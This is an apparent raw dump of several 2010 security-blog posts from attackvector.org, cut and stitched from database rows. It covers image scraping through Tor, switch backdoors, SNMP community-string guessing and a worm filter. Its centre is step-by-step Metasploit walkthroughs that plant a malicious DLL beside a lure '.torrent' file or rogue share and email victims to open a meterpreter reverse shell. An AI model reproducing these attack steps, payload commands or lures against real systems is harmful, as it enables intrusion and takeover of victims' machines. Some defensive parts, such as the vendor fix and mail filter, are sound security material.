idea.\n\n<pre lang=\"perl\" line=\"1\">\n#!/usr/bin/perl\nuse LWP::Simple;\n\n$word = $ARGV[0];\n\nif($word eq \"\") {\n  print \"Usage: $0 <picturename>n\";\n  print \"IE: $0 dogsn\";\n  print \"Note: Leave off the trailing .jpgn\";\n  exit(0);\n}\n\nwhile(1) {\n  if($i >= 1) {\n    $sw = join(\"_\", $word, $i);\n  } else {\n    $sw = $word;\n  }\n  \n  $url = \"http://www.picpaste.com/$sw.jpg\";\n  if(($body = get($url)) ne \"\") {\n    if($body =~ /.*?href=\"/(pics/.*?)\"s+title=\"$sw.jpg.*/) {\n      print \"Found: http://www.picpaste.com/$1n\";\n      system(\"wget -q http://www.picpaste.com/$1\");\n    }\n  } else {\n    print \"$url - Nothing foundn\";\n  }\n  $i++;\n}\n</pre>\n\nPS:  Yes, I was bored when I wrote this script.. ;-)\n\n[UPDATE]:\n\nHere is the new code.. with TOR support and useragent spoofing!  :-)\n\n<pre lang=\"perl\" line=\"1\">\n\n#!/usr/bin/perl  \nuse LWP::UserAgent;   \n\n$word = $ARGV[0];\n\nif($word eq \"\") {\n  print \"Usage: $0n\";\n  print \"IE: $0 dogsn\";\n  print \"Note: Leave off the trailing .jpgn\";\n  exit(0);\n}\n\nsystem(qw(export http_proxy=\"http://localhost:8118\"));\n\nwhile(1) {\n  if($i >= 1) {\n  $sw = join (\"_\", $word, $i);\n  } else {\n    $sw = $word;   \n  }\n\n  $ua = LWP::UserAgent->new;\n  $ua->agent(\'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.12) Gecko/20080201 Firefox/3.6.1.1\');\n  $ua->timeout(10);\n  $ua->proxy([qw/ http /] => \'socks://localhost:8118\');\n\n  $url = \"http://www.picpaste.com/$sw.jpg\";\n\n  $res = $ua->get($url);\n  if($res->is_success) {\n    my $body = $res->content;\n    if($body =~ /.*?href=\"/(pics/.*?)\"s+title=\"$sw.jpg.*/s) {\n      print \"Found $1n\";\n      system(\"wget -q -U \'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.12) Gecko/20080201 Firefox/3.6.1.1\' http://www.picpaste.com/$1\");\n    } else {\n      print \"$url - Nothing foundn\";\n    }\n  }\n  $i++;\n}\n</pre>\n<p></p>\nWhat you\'ll need:\n\n1) Tor (sudo apt-get install tor)\n2) Socks support for LWP::UserAgent (sudo cpan LWP::Protocol::socks)\n3) Polipo (sudo apt-get install polipo)\n\nEnjoy.  :-)\n\nThree words for the guys over at Picpaste:\n\nRandom.

This module is kind of a huge deal, because it affects many, many Windows programs.  I\'ll demonstrate one in this post, but if you follow HD Moore\'s article describing the flaws and how to detect them, he includes a few scripts to be able to test programs individually, which will help you discover new (and possibly unknown) affected software.\n\nAnyway, here is a <a href=\"http://blog.metasploit.com/2010/08/exploiting-dll-hijacking-flaws.html\" rel=\"nofollow\" target=\"_blank\">link</a> to his blog post detailing parts of the process.\n\nIf you follow the Exploit-DB feed, you\'ll notice that there\'s a deluge of DLL hijacking exploits being released.  Essentially, the people releasing these are simply using the scripts HD Moore provided to detect the new vulnerabilities and then releasing the details.  But, with the sheer amount of exploits being released, it should give you some idea as to the seriousness of this issue and the impact that it has.\n\nTo demonstrate...\n<!--more-->\n\n...I\'m going to target uTorrent, which is undoubtedly the best Torrent client for Windows.  Here is a <a href=\"http://www.exploit-db.com/exploits/14726/\" rel=\"nofollow\" target=\"_blank\">link</a> to the Exploit-DB post giving the details of the vulnerability.\n\n<blockquote>\n# msfconsole\n\nmsf > use windows/browser/webdav_dll_hijacker\nmsf exploit(webdav_dll_hijacker) > show options\n\nModule options:\n\n   Name        Current Setting  Required  Description\n   ----        ---------------  --------  -----------\n   BASENAME    policy           yes       The base name for the listed files.\n   EXTENSIONS  txt              yes       The list of extensions to generate\n   SHARENAME   documents        yes       The name of the top-level share.\n   SRVHOST     0.0.0.0          yes       The local host to listen on.\n   SRVPORT     80               yes       The daemon port to listen on (do not change)\n   URIPATH     /                yes       The URI to use (do not change).\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n</blockquote>\n\nSo, here we have the module \"webdav_dll_hijacker\" and it\'s available options.  We know from the Exploit DB post that the filename needs to have a .torrent (or .btsearch) extension.\n\n<blockquote>\nmsf exploit(webdav_dll_hijacker) > set basename owned\nbasename => owned\nmsf exploit(webdav_dll_hijacker) > set extensions \"torrent\"\nextensions => .torrent\nmsf exploit(webdav_dll_hijacker) > set sharename hacku\nsharename => hacku\nmsf exploit(webdav_dll_hijacker) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(webdav_dll_hijacker) > set lport 31337\nlport => 31337\nmsf exploit(webdav_dll_hijacker) > set lhost 1.2.3.4\nlhost => 10.0.0.58\nmsf exploit(webdav_dll_hijacker) > exploit\n[*] Exploit running as background job.\n\n[*] Started reverse handler on 1.2.3.4:31337 \n[*] \n[*] Exploit links are now available at \\1.2.3.4hacku\n[*] \n[*] Using URL: http://0.0.0.0:80/\n[*]  Local IP: http://1.2.3.4:80/\n[*] Server started.\n</blockquote>\n\nNow, on the victim machine, which is a Windows XP SP2 box, we browse over to \\1.2.3.4hacku.  As far as I know, this hijacking method works on all versions of Windows currently.  I have not tried it on anything but XP, though.  So I\'d like to hear what you discover.\n\nOnce the victim has accessed the share, a bunch of information will be displayed in the MSF console.  The important information comes when the victim clicks on the only file in the directory.

'518','7','open','http://www.attackvector.org/?p=518','0','open','','2','I cannot say enough good things about NSE (Nmap Scripting Engine).  I\'ve written a couple of posts about it and why I find it so useful, but in this post I\'m going to cover some of my favorite scripts that come with the most recent Nmap release (<a href=\"http://nmap.org/dist/nmap-5.35DC1.tar.bz2\" rel=\"nofollow\">5.35 DC1</a> (The DefCon release.. oooh.  ;-)).\n\nThe first one is \'http-enum\'.  This is a pretty simple directory enumeration, but the information obtained through the use of this script can be priceless.  Here\'s an example:\n\n<!--more-->\n<blockquote>\n# nmap -sS -p80 --script=http-enum www.blah.com\n\nStarting Nmap 5.35DC1 ( http://nmap.org ) at 2010-08-25 11:11 CDT\nNmap scan report for www.blah.com (1.2.3.4)\nHost is up (0.00024s latency).\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum:  \n|   /icons/: Icons and images\n|_  /_private/: Private (401 Unauthorized)\n...snip...\n\nNmap done: 1 IP address (1 host up) scanned in 28.78 seconds\n</blockquote>\n\nOften times you\'ll encounter directories named \'backup\', or \'test\', or whatever that contain all sorts of unprotected goodies that the web\"master\" wasn\'t expecting anyone to find.\n\nThe second one that I use a lot is \"dns-zone-transfer.nse\".  The amount of information that can be obtained through a zone transfer is huge.  You can basically dissect a targets network in short order once you understand how the DNS is laid out.\n\n<blockquote>\n# nmap -p53 --script dns-zone-transfer --script-args dnszonetransfer.domain=lamecompany.com ns.lamecompany.info\n\nStarting Nmap 5.35DC1 ( http://nmap.org ) at 2010-08-25 11:24 CDT\nNmap scan report for ns.lamecompany.info (1.2.3.200)\nHost is up (0.0070s latency).\nPORT   STATE SERVICE\n53/tcp open  domain\n| dns-zone-transfer:  \n| lamecompany.com                 SOA     ns.lamecompany.info hostmaster.lamecompany.info  \n| lamecompany.com                 A       192.168.254.0                          \n| lamecompany.com                 A       1.2.3.106                           \n| lamecompany.com                 NS      ns2.lamecompany.info                         \n| lamecompany.com                 NS      ns.lamecompany.info                          \n| lamecompany.com                 MX      ipmail.lamecompany.com                       \n| lamecompany.com                 TXT    \n| ns2.lamecompany.info            A       1.2.3.201                           \n| access.lamecompany.com          A       3.2.1.137                       \n| activewatch.lamecompany.com     A       1.2.3.131                           \n| apps.lamecompany.com            A       1.2.3.133                           \n| awfiles.lamecompany.com         A       1.2.3.164                           \n| blog.lamecompany.com            A       1.2.3.224                           \n| blogs.lamecompany.com           A       1.2.3.224                           \n| cbt.lamecompany.com             A       1.2.3.112                           \n| citrix.lamecompany.com          A       1.2.3.178                           \n| cortex.lamecompany.com          A       1.2.3.222                           \n| cortex1.lamecompany.com         A       1.2.3.222                           \n| cortex2.lamecompany.com         A       1.2.3.221            \n...big snip...\n</blockquote>\n\nHuge amounts of information given up here.  Just specify the domain name and the nameserver that\'s responsible for the domain.  The easiest way to determine this is by checking the \'whois\' of the domain.\n\nAnother favorite is the \"smb-check-vulns.nse\" script.  I like this script because it\'s fast.

So long as the file and the DLL reside in the same directory (think USB stick), the exploitation will succeed.\n<b>/UPDATE</b>\n\nSo, yesterday I wrote a post detailing the exploitation of this vulnerability using the \"webdav_dll_hijacker\" module.  The problem with this method is that you have to convince a user to connect to a rogue share.  This adds some hoops to jump through, as you have to social engineer/trick someone to browse to it.\n\nWell, here\'s an alternative that doesn\'t require any trickery.  ;-)\n\n<!--more-->\n\nI think a lot of people overlook \'msfpayload\' and wind up using \'msfconsole\' more often than not.  Well, here\'s a good example of the usefulness of \'msfpayload\'.\n\nWe\'re going to attack uTorrent again.  This will work with any of the programs which are known to be vulnerable to DLL hijacking, though.. \n\nStep 1 - We need to create the DLL payload\n\n<blockquote>\n# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.58 D > /tmp/plugin_dll.dll\nCreated by msfpayload (http://www.metasploit.com).\nPayload: windows/meterpreter/reverse_tcp\n Length: 290\nOptions: LHOST=192.168.0.58\n</blockquote>\n\nRemember, \"plugin_dll.dll\" is the DLL that uTorrent searches for in the directory when it attempts to open a .torrent file.\n\nNext, we need to create a .torrent\n\n<blockquote>\n# touch /tmp/superhotnakedchicks.torrent\n</blockquote>\n\nThat pretty much takes care of the attack part.  We can now put these two files on any share that we find and they will sit there, all innocent looking, until someone comes across them and clicks on it.  Alternatively, you could send a link to the file that is located on the victims own server.\n\nNow, we need to set up the listening meterpreter client..\n\n<blockquote>\n# msfconsole\nmsf > use exploit/multi/handler\nmsf exploit(handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set lhost 192.168.0.58\nlhost => 192.168.0.58\nmsf exploit(handler) > exploit\n[*] Started reverse handler on 192.168.0.58:4444 \n[*] Starting the payload handler...\n</blockquote>\n\nOk, now we sit and wait.. and wait.. and then we get tired of waiting so we send the victim an email with the link to the directory because we\'re impatient...\n\n<blockquote>\n[*] Sending stage (748544 bytes) to 192.168.0.252\n[*] Meterpreter session 1 opened (192.168.0.58:4444 -> 192.168.0.252:1165) at Wed Aug 25 13:56:46 -0500 2010\n\nmeterpreter > getuid\nServer username: VICTIMAdministrator\n</blockquote>\n\nHard to get much more simple than that.

I don\'t usually like to regurgitate stuff, but if I have nothing to write myself and I come across something that I consider to be valuable, interesting, insightful, or whatever, I will.  :-)\n\n[BEGIN REGURGITATION of <a href=\"http://www.exploit-db.com/exploits/14875/\" rel=\"nofollow\" target=\"_blank\">http://www.exploit-db.com/exploits/14875/</a>]\n\nOn the 15th of august 2009, at the HAR2009 conference, the existence of a backdoor password in Accton-based switches was revealed by Edwin Eefting, Erik Smit and Erwin Drent [1][2]. Even though this is a >365-day exploit, it does not seem to be listed in any of the vulnerability databases. Also, I could not find a patch for any of the vulnerable devices. According to the researchers, they contacted 3Com and Accton, but did not receive a response. I have a vulnerable 3Com 3812 in my lab and contacted the 3Com SRT months ago, but did not receive a response either. This seems to be a forgotten bug...\n<!--more-->\nThe Accton company builds switches, which are rebranded and sold by several manufacturers (including 3Com, Dell, SMC, Foundry and EdgeCore). The researchers list at least the 3Com 3812, 3Com 3870 and Edgecore ES4649 as vulnerable[3], but other vendors are affected as well. For example, I could also reproduce the behavior on a Dell PowerConnect 5224 switch.\n \nThe backdoor password can be calculated if you have the switch MAC-address, which can be obtained via ARP or SNMP (if you know the community string).

'571','4','open','http://www.attackvector.org/?p=571','0','open','','2','First, if you\'ve never fully researched SNMP (Simple Network Management Protocol), I suggest you go do that now because you\'re doing yourself a major disservice by not knowing/using the information that\'s available through the use of this protocol... not to mention the amount of remote control you have over a machine if you\'re able to get an administrative community string.\n\nMost network devices that come with SNMP enabled have two (or more) different community strings.  A community string is, basically, the only authentication you need in order to gain access through SNMP.  There will be a \"read only\" community string (usually \'public\'), and a read/write community string (usually \'private\').  Lately, developers have been doing a better job at making sure that the default community strings don\'t come with read/write enabled, but not all.\n<!--more-->\nEven if you don\'t have the read/write string, simply being able to read from a system gives out a wealth of information.  You can view shares, see installed programs, find open ports, pretty much everything you\'d ever want to know about a system.  \n\nSo, first you need to find a box on the network that has SNMP available:\n\n<blockquote>\n# nmap -sU 1.2.3.* -PN -p161 --open\n</blockquote>\n\nNow, probably the easiest way to collect info from a box is with \'snmpwalk\':\n\n<blockquote>\n$ snmpwalk -c public -v1 1.2.3.4 >> output.txt\n</blockquote>\n\nThe SNMP version will be different depending on the device.  If \'1\' doesn\'t work, try \'-v2c\'.  If that doesn\'t work, try \'-v3\'.  I find most often it\'s either version 1 or 2c.\n\nThe output will look something like this:\n\n<blockquote>\nSNMPv2-MIB::sysDescr.0 = STRING: Canon iR C5185 /P\nSNMPv2-MIB::sysObjectID.0 = OID: SNMPv2-SMI::enterprises.1602.4.7\nDISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (409740748) 47 days, 10:10:07.48\nSNMPv2-MIB::sysContact.0 = STRING: joe@microsoft.com\nSNMPv2-MIB::sysName.0 = STRING: Canon iR C5185\n..huge snip..\n</blockquote>\n\nNow, lets say that you want to actually change one of these settings.  This is where the read/write community string comes into play.  The problem is, though, is that you don\'t know what it is.  It could literally be anything......\n\nEnter Metasploit.  :-D\n\nI was actually going to write a tool to do this but decided to search the Metasploit modules first to see what they had for SNMP tools and came across the \"scanner/snmp/community\" module.\n\nUsage is incredibly simple..\n\n<blockquote>\n# msfcli scanner/snmp/community rhosts=1.2.3.4 e\n[*] Please wait while we load the module tree...\n[*] >> progress (1.2.3.4-1.2.3.4) 0/118...\n[*] 1.2.3.4 \'public\' \'Canon iR C5185 /P\'\n[*] 1.2.3.4 \'canon_admin\' \'Canon iR C5185 /P\'\n[*] Scanned 1 of 1 hosts (100% complete)\n</blockquote>\n\nSweet.. so the second community string is \"canon_admin\".  I\'m willing to bet that with a name like \"admin\", it probably has read/write capabilities..\n\n<blockquote>\n# snmpget -v1 -c canon_admin 1.2.3.4 sysContact.0\nSNMPv2-MIB::sysContact.0 = STRING: joe@microsoft.com\n\n# snmpset -v1 -c canon_admin 1.2.3.4 sysContact.0 s matt@attackvector.org\nSNMPv2-MIB::sysContact.0 = STRING: matt@attackvector.org\n\n# snmpget -v1 -c canon_admin 1.2.3.4 sysContact.0\nSNMPv2-MIB::sysContact.0 = STRING: matt@attackvector.org\n</blockquote>\n\nYep, sure enough.\n\nYou can use \'snmpget\' to get a specific OID.. and use \'snmpset\' to set a specific OID.  The \'s\' before the value indicates that we\'re supplying a string.\n','','2010-09-03 14:07:37','2010-09-03 19:07:37','','','2010-09-03 14:07:37','2010-09-03 19:07:37','compromising-hosts-with-snmp','0','','publish','Compromising Hosts With SNMP','post',''),(
'573','15','open','http://www.attackvector.org/?p=573','0','open','','2','Dear Microsoft,\n\nI have watched you develop as a company, starting with Windows 3.1.  It was most peoples first experience with a PC and considering that there was really no other marketed OS (Linux was brand new and not really totally \"usable\" yet.  I ran it, but it was not for the faint of heart.  All the other Unices were geared toward infrastructure use, not home use) that allowed you to multitask, had a GUI, and was in color, you had the lions share of the market.\n\nSecurity wasn\'t much of an issue back in these days.  There were no home networks, most people had never been on the internet, and the web had just come into existence.  You had a free pass.\n\nThen, in 1995, you raised the bar with Windows 95.  This was epic.  More colors, way more features, and more software.  Oh, and networking was built in to the core of the OS.  Now everyone was getting online.  This was great for society, but not so great for you, Microsoft, as this is when the public started to realize that the code you were producing was, well, terrible at best.\n\nWhat really set this off was \"WinNuke\", you remember, I\'m sure.  Just a simple TCP connection to port 139 and sending \"msg_oob\" caused Windows 3.1, 95 and NT to crash.  Remember?  This is when the term \"Blue Screen of Death\" was made mainstream.\n<!--more-->\nAs a result, bored kids worldwide began to dig deeper and try to come up with new ways to make Windows crash.  Initially, this was to knock people off of IRC (Internet Relay Chat), but it grew.  Lets run down the list of TCP stack issues you encountered back in the mid to late 90\'s:\n\n* Winnuke\n* TearDrop\n* TearDrop v2 (yes, v2.. you remember, you screwed up in your attempt to patch for v1...)\n* NewTear (...yeah, not even going to comment on this one)\n* Boink\n* Bonk\n* Frag\n* Nestea\n* Nestea v2 (...another wonderful patch job)\n* Sping\n* Jolt\n* Land\n\nAll of those caused Windows 3.1 - 98 to crash.  That\'s right, a user could be sitting at their computer and boom, blue screen.  This wasn\'t a huge issue at first, because it was limited to people on IRC, for the most part.  It didn\'t affect home users, because they weren\'t being targeted... that was until someone wrote a perl script to run a few of these attacks against incrementing IP addresses starting with 1.1.1.1.  I vaguely recall hearing something about NASA being downed by this attack.. hmmm.\n\nBeyond the denial of service attacks, you also encountered all of the issues with IIS.  I honestly don\'t even know where to begin with IIS.  Thanks to you and the developers of IIS, we saw the internet get owned in a multitude of ways.  The first were individual hacker groups owning just about every website they\'d come across.  The White House, FBI, CIA, NASA, and just about every other government organization was among these who had their website defaced.  We wont even begin to mention the millions of company websites that were owned.  I do remember hearing something about a classified memo from the high ups in Microsoft indicating that there shall be \"no internet facing Windows boxes\".  You expected your users to run your software, but refused to yourself and wound up using a de-badged version of Apache running on some perverted version of *nix to host your website.\n\nBeyond that, we have countless internet worms that all target vulnerabilities/weaknesses in the Windows product.  Lets take a look at the list (with damages included where possible):\n\n* Melissa - $1,200,000,000\n* ILOVEYOU - $15,000,000,000\n* Anna Kournikova\n* Sandmind\n* Sircam - $1,000,000,000\n* Code Red - $2,000,000,000\n* Code Red II (another wonderful patch job?)\n* Nimda - $635,000,000\n* SQL Slammer - $750,000,000\n* Blaster - $320,000,000\n* SoBig - $37,100,000,000 (whoa.)\n* Sober\n* MyDoom - $38,000,000,000 (whoa!)\n* Sasser - $500,000,000\n* Conficker - $9,100,000,000\n\nI could go on and on, but those are the big ones.  So, totaling all of those up, you\'ve cost us around $105,605,000,000 (one-hundred and five billion dollars).  This is interesting, because if Ford released a car that was so faulty that it caused $105,605,000,000 dollars to US citizens, you had better believe that there would be a huge class act lawsuit AND a good chance that Ford would no longer be in business... yet, somehow, you\'ve managed to make it all this time unscathed, except for the antitrust business, which you brought on yourself.\n\nBut, you haven\'t stopped.  Just about every single day a new vulnerability is discovered in your code, with exploits to follow.  They\'re being released publicly, or sold on the black market, because, apparently, you, Microsoft, think that paying a \"bug bounty\" is not a good idea.  Well, I suppose it\'s not a good idea if you use buggy, vulnerable software as motivation to upgrade to newer, more buggy software, but there will come a time where, hopefully, people grow tired of constantly getting owned.\n\nThey\'ve become so accustomed to getting hacked in some form or another, that they don\'t even think about it anymore.  \"Oh, yeah, I got a virus and had to buy a new computer\", \"my computer is so fricken slow because of spyware, I\'m just going to buy a new one\", \"I don\'t open attachments from anyone anymore.. the last time I did someone stole my bank account information\", etc. etc.\n\nI wonder what part of the national debt you\'ve contributed to, Microsoft.  You claim that you\'re spending millions upon millions of dollars focusing on security, but the fact of the matter is, you\'re failing.  Just last week a bug was rediscovered (DLL hijacking) that was initially brought to your attention 10 years ago.  10 YEARS AGO!  But, you\'re so arrogant that you decided to just ignore it.  I\'m sure the mentality of it was, \"well, if this thing gets out and people start getting hacked, we can sell them a new version of Windows!\"\n\nJust remember, Microsoft, that when people begin to get tired of having their bank account information stolen and having to buy new computers because they run an operating system that is written by the marketing department, you\'ll just be a blip on a timeline comparable to the bubonic plague.\n\nSincerely,\nMatt\nAttackVector.org\n\nFor those interested in finding an OS that\'s better, more stable, more secure (ie - you can browse the web again without having to worry about getting spyware, viruses, or what links you click on.. ooooooo!), visit the following links:\n\nUbuntu Linux - probably the easiest distribution of Linux to use/run/operate.

Thanks CK!\n\nHere\'s the exchange plus the fix:\n\n<!--more-->\n\n<blockquote>\nhi, Matt,\nThanks for bringing up this security issue.\nIn order to help customer who forgot the password and doesn’t want to loss the configuration to login the switch to change the existing password. So we provided this mechanism if customer provide us the MAC address of the his switch, we will generate a unique password for such switch for him/her. It is regret the it come out to be a security issue.\n\nLast year, when we received this information that somebody break the algorithm, we had already changed our firmware so that this password can’t be used via Telnet, Web etc protocol via network. Only when the administrator can physically reach the switch via console login, then this password is valid.\n\nSome of the switches which had been phased out may still have the problem, If any customer has such concern, please contact us, we will take the full responsibility to help him/her fix the problem.\n\nThanks again for your attention to prevent people using our switches from being attack. It is also our responsibility. Should you have any suggestion or comment, please feel free to contact me.\n\nBest Regards\nC.K.NG\n</blockquote>\n\n<blockquote>\n@CK: I understand your argument, but my take is this:\n\nIf, say, 2% of your customer base forget their passwords and have to reset their devices and start from scratch, why would you put the other 98% of your customer base at risk for getting owned? Personally, if I ran one of your routers/switches/whatever and found out that I had lost trade secrets or valuable information due to a hole that your company intentionally put in to my router/switch, you would have a lawsuit on your hands.\n\nIt is not your responsibility to provide a way for your customers to log in to their device if they’ve forgotten their password. If they’ve made the mistake of setting a password and not documenting it, remembering it, something, that is not your company’s issue – it’s theirs. And, if they have to reset their router/switch as a result of their carelessness, maybe the task of reconfiguring the router will make them be a little more diligent the next time.\n\nAll of us have forgotten our passwords to something at some point in our lives. I’ve hit the “reset” button on many devices in my day due to not having documented a password. This is my own fault and I accept that.\n</blockquote>\n\n<blockquote>\nDear Matt,\nThanks for your comment, you are absolutely correct. but it also showed that our company is care about customer, even they are the 2%.\n\nAnyway I think if customer use the switch properly, it won’t be attacked by the super password issue.\n\nFirstly, normally customer will separate the user vlan from management vlan, so user can reach the switch.\n\nSecondary, even if user and switch in the same vlan (subnet), or the management vlan can be accessed by routing, we still have a way to prevent switch from attack,\n\nby using the command showing below, only specified management IP can access the switch.\n\nConsole#config\nConsole(config)#management ?\nall-client Adds IP addresses to SNMP, Web and Telnet groups\nhttp-client Adds IP addresses to the Web group\nsnmp-client Adds IP addresses to the SNMP group\ntelnet-client Adds IP addresses to the Telnet group\nConsole(config)#management all-client ?\nA.B.C.D Starts IP address\nConsole(config)#management all-client 192.168.1.1 ?\nA.B.C.D Ends IP address\n\nConsole(config)#management all-client 192.168.1.1 192.168.1.10\n\nonly IP address within 192.168.1.1-10 can access the switch via telnet, http, snmp or all\n\nusing this way, user also can’t get mac of the switch via SNMP\n\nPlease comment if it address your connern. Thanks.\n\n\nPlease also don’t forget to change the default username and password\n\nConsole(config)#no username guest\nConsole(config)#no username admin\nConsole(config)#username ck_ng password 0 Support\nConsole(config)#enable password level 15 0 Support\n\nFrom log you can also see who is login to the switch\n\nConsole#sh log ram\n\n[488] 02:11:09 2001-01-01\n“LoginSuccess,__super,WEB,10.2.32.162″\n\n[20] 00:11:58 2001-01-01\n“LoginSuccess,ck_ng,Console,10.2.4.21″\nlevel: 6, module: 5, function: 1, and event no.: 1\n\n[18] 00:11:34 2001-01-01\n“LoginFailure,guest,Console,10.2.4.21″\n\n[15] 00:09:29 2001-01-01\n“LoginFailure,admin,Console,10.2.4.21″\nlevel: 6, module: 5, function: 1, and event no.: 1\n</blockquote>\n\nThank you CK for providing us with a workaround.  I\'m sure there are a lot of people who run Accton based switches that will find this information useful.\n\n','','2010-09-10 09:26:29','2010-09-10 14:26:29','','','2010-09-10 09:26:29','2010-09-10 14:26:29','vendor-response-to-backdoor-in-accton-switches-post','0','','publish','Vendor Response to Backdoor in Accton Switches Post','post',''),(

Where has this chick been?  ;-)  ANYWAY.....\n\nWhenever I hear about an email worm going around an infecting people left and right, I kind of chuckle to myself.  These are absurdly easy to block, yet no one seems to do it.  I\'m in charge of all the network operations at the company that I work for and it\'s a relatively small company, yet we\'ve never been hit by any of the major email worms that have surfaced over the years.  Why?\n\nWell, it\'s simple.. just like spam, there are certain characteristics that are static across all of the emails that are being generated.  Yes, sometimes they\'re more difficult to pinpoint than others, but usually (as is the case here), it\'s trivial.\n<!--more-->\nFrom all of the samples that I\'ve seen, we\'re dealing with two different subject lines.  Obviously, the creators of this worm were not interested in filter evasion, otherwise they would have created an array of thousands of different subject lines and messages.  That, in addition to thousands of random file names and websites that are hosting the file, and you\'ve got yourself a worm that\'s moderately difficult to block.  So, you future worm writers of the world, go big or go home.</p>\nAnyway, as I\'ve mentioned in a previous post, I rely heavily upon Mimedefang to filter email at the gateway.  It\'s a very straight forward milter for Sendmail that allows you to write custom filters in Perl.  And, since I\'m sure all of you know about my love for Perl, you can see why I\'m immediately drawn to this.  :-)\n\nIf you\'ve never played with <a rel=\"nofollow\" href=\"http://www.mimedefang.org/\" target=\"_blank\">Mimedefang</a>, I highly recommend you check it out.\n\nSo, on to the filtering.  My filter file has, well, lots of rules that accomplish a variety of different tasks.  In order to filter this one, though, it\'s a simple pattern match:\n<pre lang=\"perl\">   if(/^.*?Subject:s+here you have.*/i || /^.*?Subject:s+just for you.*/i) {\n      foreach $recip (@Recipients) {\n      delete_recipient($recip);\n   }\n   add_recipient(\'spam@localhost\');\n   action_change_header(\'Subject\', \"BANNED - VIRUS - $Subject\");\n}</pre>\nTrivial.  You place this under the \"filter_begin\" routine.  Also, in order to get access to the headers, there are two files which Mimedefang stores.  One is called \"COMMANDS\" and one is called \"INPUTMSG\".  You\'ll want to open the \"INPUTMSG\" file in order to parse the subject line.\n\nExample:\n<pre lang=\"perl\">open(F, \"./INPUTMSG\") || die \"$!\";\nwhile() {\n   if(/^.*?Subject.......blah blah blah\n}</pre>\nAnyway, this is just a simple example of a way to take care of some of these lame worms at the gateway so that your end users never even see them.  Mimedefang, like pretty much everything else I use, is free.  So, it always gives me a warm fuzzy when large companies (ABC, NASA, etc.) get pwned by some lame worm when they run like, $50,000 email filtering systems, yet my simple little Perl script and Mimedefang somehow has kept us protected.\n\nSome of you are probably thinking, \"Yeah, but if you had the amount of emails coming through that those guys do, your Perl script would kill your box\"\n\nTrust me, I thought about that ahead of time.  The one nice thing about milters, in general, is that they\'re written in C and are usually pretty quick and not super resource intensive.. so the idea of running a milter that delegates the task of filtering to a scripting language was definitely a concern.  However, on this box, which is a Pentium 2.8ghz dual core (11,205.53 bogomips total), the load average stayed below 2 all the way up to 250 emails a minute.  Sure, this is not a solution for the Gmail\'s and Yahoo\'s of the world, but does your company receive 250 emails a minute?  Probably not.\n\nAlso, I\'ve written in some throttling to ensure that it backs off if the load increases too significantly.\n\nAnyway, if you have any questions about filtering with Mimedefang, let me know.. if inadvertently become pretty well versed in it.  :-)','','2010-09-10 12:24:00','2010-09-10 17:24:00','','','2010-09-10 12:24:00','2010-09-10 17:24:00','0day-here-you-have-worm-prevention-at-the-gateway','0','','publish','0day \"Here you have\" Worm - Prevention at the Gateway','post',''),(

He (or she) revealed no details about his identity, but said, \"The creation of this is just a tool to reach my voice to people maybe... or maybe other things.\"\n\nHe said he had not expected the worm to spread as broadly as it had, and noted that he could have done much more damage to victims. \"I could smash all those infected but I wouldn\'t,\" said the hacker. \"I hope all people understand that I am not negative person!\" In other parts of the message, he was critical of the U.S. war in Iraq.\n\nOn Sunday, <a href=\"http://www.youtube.com/profile?user=iqziad#p/u/0/IkMifFGqt78\" rel=\"nofollow\" target=\"_blank\">Iraq Resistance posted a video echoing these sentiments</a> and complaining, through a computer-generated voice, that his actions were not as bad as those of Terry Jones. Jones is the pastor at a small Florida church who received worldwide attention this week for threatening to burn copies of the Koran.\n<!--more-->\nSecurity experts agree that the worm could have caused more damage. However, it did include some very malicious components, such as password logging software and a backdoor program that could have been used to allow its creator to control infected machines. But because the software was not terribly sophisticated, it was quickly shut down as Web servers that it used to infect machines and issue new commands were taken offline last week.\n\n\"Here you have\" spread when victims clicked on a Web link and then allowed a malicious script to run on their computer.  <a href=\"http://www.symantec.com/security_response/writeup.jsp?docid=2010-082013-3322-99&tabid=2\" rel=\"nofollow\" target=\"_blank\">It is the more-successful follow-up to an August worm</a> that included the e-mail address that Iraq Resistance used to communicate with the IDG News Service.\n\nAccording to Cisco, the worm accounted for between 6 percent and 14 percent of the world\'s spam for a few hours Thursday. It primarily gummed up corporate e-mail networks in the U.S.\n\nIt is the first worm in years to have such a widespread and noisy effect, hearkening back to the days of the Anna Kournikova worm. Nowadays, most malware writers don\'t want to draw attention to their activities, because they generally want to keep their malicious software hidden away on victims\' computers as long as possible.\n\nDisney, Proctor and Gamble, Wells Fargo and the U.S. National Aeronautics and Space Administration (NASA) are among the organizations reported to have been hit by the worm.\n\nSecureWorks Researcher Joe Stewart believes that Iraq Defense is a Libyan hacker who is trying to <a href=\"http://www.computerworld.com/s/article/9184718/Cyber_jihad_group_linked_to_Here_you_have_worm\" rel=\"nofollow\" target=\"_blank\">gain followers for a cyber jihad hacking group called Brigades of Tariq ibn Ziyad</a>.\n\nTariq ibn Ziyad was the eighth century commander who conquered much of Spain on behalf of the Umayyad Caliphate. Iraq Resistance\'s YouTube video has a Spanish theme too. It shows a map of Andalucia, and Iraq Resistance lists his location as \"Spain\" in his YouTube profile.\n\nIn his e-mails, Iraq Resistance did not answer questions about his identity, saying that he was worried about his safety. \"I think this information is enough for you and having more looks like [an] investigation,\" he said. \"I don\'t see myself that criminal.\"\n\n<i>Robert McMillan covers computer security and general technology breaking news for The IDG News Service.

